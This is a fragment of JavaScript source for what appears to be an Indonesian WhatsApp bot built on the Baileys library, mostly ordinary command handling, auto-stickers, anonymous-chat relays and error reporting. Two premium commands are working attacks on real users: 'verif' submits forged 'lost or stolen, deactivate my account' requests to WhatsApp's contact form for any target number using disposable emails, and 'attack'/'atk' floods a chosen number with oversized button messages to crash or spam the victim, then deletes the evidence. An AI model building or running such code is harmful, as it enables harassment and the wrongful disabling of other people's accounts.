  if(module.includes("@adiwajshing/baileys")){
    listSerch.push({
    title: module,
    rowId: `${prefix}$ npm i ${module}@https://github.com/offficialdittaz/BaileysFix`,
    description: `🔖 github:officialdittaz/BaileysFix`
    },{
    title: module,
    rowId: `${prefix}$ npm i ${module}@https://github.com/amiruldev20/baileys`,
    description: `🔖 github:amiruldev20/baileys`
    })
    
  }
    const sections = [
    {
    title: "Total Version " + yaya.length,
    rows: listSerch
    }
    ]
    const listMessage = {
    text: teskd,
    footer: copyright,
    title: `*List Version*`,
    buttonText: "TAP",
    sections
    }
    conn.sendMessage(from, listMessage, {quoted: m})

})
}
break 

case 'uninstall': {
if (!itsMe && !isOwner) return onlyOwner()
const lala = JSON.parse(fs.readFileSync('./package.json'))
 
let listSerch = []
let listmodule = Object.keys(lala.dependencies)
    let nono = Object.entries(lala.dependencies)
    let teskd = `\nResult From *Package*\n\n*Select any module*`
    for (let i of nono) {
    listSerch.push({
    title: i[0],
    rowId: `${prefix}$ npm uninstall ${i[0]}`,
    description: `${i[1]}`
    })
    }
    const sections = [
    {
    title: "Total Module " + listmodule.length,
    rows: listSerch
    }
    ]
    const listMessage = {
    text: teskd,
    footer: copyright,
    title: `*Uninstall Dependencies*`,
    buttonText: "FOUND",
    sections
    }
    conn.sendMessage(from, listMessage, {quoted: m})
    }
    break 
    case "verif":
        {
          if (!isPremium) return setReply(mess.only.prem);
          {
            var axioss = require("axios");
            let ntah = await axioss.get(
              "https://www.whatsapp.com/contact/noclient/"
            );
            let email = await axioss.get(
              "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10"
            );
            let cookie = ntah.headers["set-cookie"].join("; ");
            let $ = cheerio.load(ntah.data);
            let $form = $("form");
            let url = new URL($form.attr("action"), "https://www.whatsapp.com")
              .href;
            let form = new URLSearchParams();
            form.append("jazoest", $form.find("input[name=jazoest]").val());
            form.append("lsd", $form.find("input[name=lsd]").val());
            form.append("step", "submit");
            form.append("country_selector", "ID");
            form.append("phone_number", q);
            form.append("email", email.data[0]);
            form.append("email_confirm", email.data[0]);
            form.append("platform", "ANDROID");
            form.append("your_message", "Hilang/Dicuri: Nonaktifkan akun saya");
            form.append("__user", "0");
            form.append("__a", "1");
            form.append("__csr", "");
            form.append("__req", "8");
            form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
            form.append("dpr", "1");
            form.append("__ccg", "UNKNOWN");
            form.append("__rev", "1006630858");
            form.append("__comment_req", "0");
            let res = await axioss({
              url,
              method: "POST",
              data: form,
              headers: {
                cookie,
              },
            });
            reply(util.format(JSON.pars));
          }
        }
        break;
      case "attack":
        if (!isPremium) return setReply(mess.only.prem);
        if (!q) return setReply(`Mau Attack Siapa?`);
        let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "");
        let noget = nomore
          .replace(/[@s.whatsapnet]/g, "")
          .replace(/[@S.WHATSAPNET]/g, "");
        if (isNaN(noget)) return setreply(`Must be a number Bitch!! `);
        var satgnz = "6281316701742";
        let isnoown = new RegExp(satgnz, "i");
        var cekon = await conn.onWhatsApp(nomore);
        if (cekon.length == 0)
          return setReply(
            `Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`
          );
        let isOwn = isnoown.test(q);
        if (isOwn) return setReply(`You Can't ${command} My Owner Bitch!`);
        {
          var listMsg = {
            text: `${ucapanWaktu} @${
              sender.split("@")[0]
            }, \n\nSilahkan Pilih Durasi Penyerangan\n*PERINGATAN*\nPesan Ini Akan Di Hapus Setelah Anda Memilih Durasi\nDan Jangan Gunakan Fitur Ini Dalam Keadaan Dendam.`,
            buttonText: "Click Here!",
            footer: copyright,
            mentions: [sender],
            sections: [
              {
                title: "MINUTE SELECTION",
                rows: [
                  {
                    title: "1 Minute",
                    rowId: `${prefix}atk ${noget}|1`,
                    description: `Attack ${noget} During 1 Minute `,
                  },
                  {
                    title: "2 Minute",
                    rowId: `${prefix}atk ${noget}|2`,
                    description: `Attack ${noget} During 2 Minute`,
                  },
                  {
                    title: "3 Minute",
                    rowId: `${prefix}atk ${noget}|3`,
                    description: `Attack ${noget} During 3 Minute`,
                  },
                  {
                    title: "4 Minute",
                    rowId: `${prefix}atk ${noget}|4`,
                    description: `Attack ${noget} During 4 Minute`,
                  },
                  {
                    title: "5 Minute",
                    rowId: `${prefix}atk ${noget}|5`,
                    description: `Attack ${noget} During 5 Minute`,
                  },
                ],
              },
              {
                title: "CLOCK SELECTION",
                rows: [
                  {
                    title: "1 Hours",
                    rowId: `${prefix}atk ${noget}|60`,
                    description: `Attack ${noget} During 1 Hours `,
                  },
                  {
                    title: "2 Hours",
                    rowId: `${prefix}atk ${noget}|120`,
                    description: `Attack ${noget} During 2 Hours `,
                  },
                  {
                    title: "3 Hours",
                    rowId: `${prefix}atk ${noget}|180`,
                    description: `Attack ${noget} During 3 Hours `,
                  },
                  {
                    title: "4 Hours",
                    rowId: `${prefix}atk ${noget}|240`,
                    description: `Attack ${noget} During 4 Hours `,
                  },
                  {
                    title: "5 Hours",
                    rowId: `${prefix}atk ${noget}|300`,
                    description: `Attack ${noget} During 5 Hours `,
                  },
                ],
              },
            ],
          };
          conn.sendMessage(from, listMsg);
        }
        break;
      case 'atk':{
        if (!isPremium) return reply(mess.only.prem);
        let spar = q.split("|")[0];
        let terern = q.split("|")[1];
        var satgnz = "6281316701742";
        let isLinkThisGc = new RegExp(satgnz, "i");
        let isgclink = isLinkThisGc.test(q);
        if (isgclink) return reply(`You Can't Attack My Owner`);
        if (!terern) return reply(`Examples of use : ${command} *>Target<*|*>Amount<*`);
        for (let i = 0; i < terern; i++) {
          const muk = [
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              urlButton: {
                displayText: `Owner Bot`,
                url: `https://wa.me/${global.owner}`,
              },
            },
            {
              quickReplyButton: {
                displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`,
                id: `${prefix}dashboard`,
              },
            },
            {
              quickReplyButton: {
                displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`,
                id: `${prefix}dashboard`,
              },
            },
            {
              quickReplyButton: {
                displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`,
                id: `${prefix}sewa`,
              },
            },
            {
              quickReplyButton: {
                displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`,
                id: `${prefix}dashboard`,
              },
            },
            {
              quickReplyButton: {
                displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`,
                id: `${prefix}dashboard`,
              },
            },
            {
              quickReplyButton: {
                displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`,
                id: `${prefix}sewa`,
              },
            },
            {
              quickReplyButton: {
                displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`,
                id: `${prefix}dashboard`,
              },
            },
            {
              quickReplyButton: {
                displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`,
                id: `${prefix}dashboard`,
              },
            },
            {
              quickReplyButton: {
                displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`,
                id: `${prefix}sewa`,
              },
            },
            {
              quickReplyButton: {
                displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`,
                id: `${prefix}dashboard`,
              },
            },
            {
              quickReplyButton: {
                displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`,
                id: `${prefix}dashboard`,
              },
            },
            {
              quickReplyButton: {
                displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`,
                id: `${prefix}sewa`,
              },
            },
          ];
          let butMess = {
            text: 'Misi Om',
            footer: copyright,
            templateButtons: muk,
            headerType: 4
          }
          conn.sendMessage(
            spar + "@s.whatsapp.net", butMess)
        }
        await sleep(3000)
        conn.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: dev.quoted.id, participant: mentionByReply } })
        await sleep(3000)
        setReply(`Berhasil mengirim Bug ke Nomer @${spar}`);
      }
        break
//=================================================================================================
    

default:
if (isCmd) {
await Nothing(toFirstCase(command), dash, allcommand)
const stringSimilarity = require("string-similarity");
let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand)
let dym = {
  text: `Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*\nabaikan jika salah`,
  footer: `${copyright}`,
  buttons: [{"buttonId": `${prefix+matches.bestMatch.target.toLowerCase()}`,"buttonText": {"displayText": `${matches.bestMatch.target.toLowerCase()}`},"type": "RESPONSE"}],
  headerType: 1
  }
conn.sendMessage(from, dym, {quoted:m})
} 
} //Akhir switch command
if (m.chat.endsWith("@s.whatsapp.net") && !isCmd) {
          this.anonymous = this.anonymous ? this.anonymous : {};
          let room = Object.values(this.anonymous).find(
            (room) =>
              [room.a, room.b].includes(m.sender) && room.state === "CHATTING"
          );
          if (room) {
            if (/^.*(next|leave|start)/.test(m.text)) return;
            if (
              [
                ".next",
                ".leave",
                ".stop",
                ".start",
                "Cari Partner",
                "Keluar",
                "Lanjut",
                "Stop",
              ].includes(m.text)
            )
              return;
            let other = [room.a, room.b].find((user) => user !== m.sender);
            m.copyNForward(
              other,
              true,
              m.quoted && m.quoted.fromMe
                ? {
                    contextInfo: {
                      ...m.msg.contextInfo,
                      forwardingScore: 0,
                      isForwarded: true,
                      participant: other,
                    },
                  }
                : {}
            );
          }
          this.menfess = this.menfess ? this.menfess : {};
          let mroom = Object.values(this.menfess).find(
            (room) =>
              [room.a, room.b].includes(m.sender) && room.state === "CHATTING"
          );
          if (mroom) {
            if (/^.*(next|leave|start)/.test(m.text)) return;
            if (
              [
                ".next",
                ".leave",
                ".stop",
                ".start",
                "Cari Partner",
                "Keluar",
                "Lanjut",
                "Stop",
              ].includes(m.text)
            )
              return;
            let other = [mroom.a, mroom.b].find((user) => user !== m.sender);
            m.copyNForward(
              other,
              true,
              m.quoted && m.quoted.fromMe
                ? {
                    contextInfo: {
                      ...m.msg.contextInfo,
                      forwardingScore: 0,
                      isForwarded: true,
                      participant: other,
                    },
                  }
                : {}
            );
          }
        }

if (isImage && autoSticker) {
try{
let WSF = require('wa-sticker-formatter')
let wsf = false
let mime = (dev.msg || dev).mimetype || ''
if (/image/.test(mime)) {
let img = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
wsf = new WSF.Sticker(img, {
pack: packName,
type: WSF.StickerTypes.FULL,
author: authorName,
crop: true,
})
}        
if (wsf) {
await wsf.build()
const sticBuffer = await wsf.get()
if (sticBuffer) await conn.sendMessage(from, { sticker: sticBuffer }, {
quoted: dev,
mimetype: 'image/webp',
ephemeralExpiration: 86400
})
}
}catch(err){

}
}
    
//ketika ada yang invite/kirim link grup di chat pribadi
//Di kasih ama Alyul
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let { dada } = require("../message/sewabot.js")
let teks = dada(prefix, pushname, ucapanWaktu)      
let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
conn.sendButLoc(from, teks,copyright, fs.readFileSync('./stik/thumb.jpeg'), gbutsan)
}



//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
conn.sendMessage(from,{text:  `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`}, { quoted: setQuoted })
 }

//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Walaikumsalam kak")
}
/*
//Auto delete sampah
if(isCmd){
let path = require('path');
let directoryPath = path.join();
fs.readdir(directoryPath, async function (err, files) {
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm")   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`

filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
}) 

if(filteredArray.length > 0){
Log(teks) 
Log("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(file)
});
Log("Berhasil menghapus semua sampah")
}

});
}
*/
	
                                 


} catch (err){
  Log(err)
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
if(err.message.includes("Cannot find module")){
let module = err.message.split("Cannot find module '")[1].split("'")[0]
let teks = `Module ${module} belom di install
silakan klik tombol install di bawah terlebih dahulu`
let mok = [{"buttonId": `${prefix}exec npm i ${module}`,"buttonText": {"displayText": `Install`},"type": "RESPONSE"},
          {"buttonId": `${prefix}report module ${module} belom di install`,"buttonText": {"displayText": `Report`},"type": "RESPONSE"}]
let nono = {
  text: teks,
  footer: `${copyright}\n${calender}`,
  buttons: mok,
  headerType: 1
  }
  
  return await conn.sendMessage(dev.key.remoteJid, nono , {quoted: dev})
}
await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`) 
if(checkError(err.message, db.data.listerror)) return
addError(err.message, command, db.data.listerror)
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){ 
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await conn.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]───── 「 Laporan Bug ⚠️」 ─────[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`
let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${copyright}\n${calender}`,
buttons: mok,
headerType: 1
}

await conn.sendMessage(Ownerin, tolol , {quoted: fkontak})

if(!autoblockcmd){
await conn.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await conn.sendMedia (Ownerin, media, dev, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



  
} catch (err){
console.log(chalk.bgRed(color("[  ERROR  ]", "black")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true
 conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if(Console){
conn.sendMessage(Ownerin, {text : util.format(e)})
}
//console.log(e)
}
}

       
    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.bgGreen(color("[  UPDATE ]", "black")),chalk.white(`${__filename}`) )
delete require.cache[file]
require(file)
})

